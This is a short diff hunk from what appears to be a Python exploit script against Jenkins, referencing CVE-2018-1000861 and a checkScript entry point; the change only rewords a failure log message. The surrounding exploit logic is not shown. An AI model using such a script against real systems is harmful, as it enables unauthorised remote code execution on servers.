@@ -121,4 +121,4 @@ if __name__ == '__main__':
         _log('Bypass with CVE-2018-1000861!')
         exploit(_add_bypass(url), cmd)
     else:
-        _log('The `checkScript` is not found, please try other entries(see refs)', fail=True)
+        _log('The `checkScript` is not found, please try other entries (see refs / listable users)', fail=True)
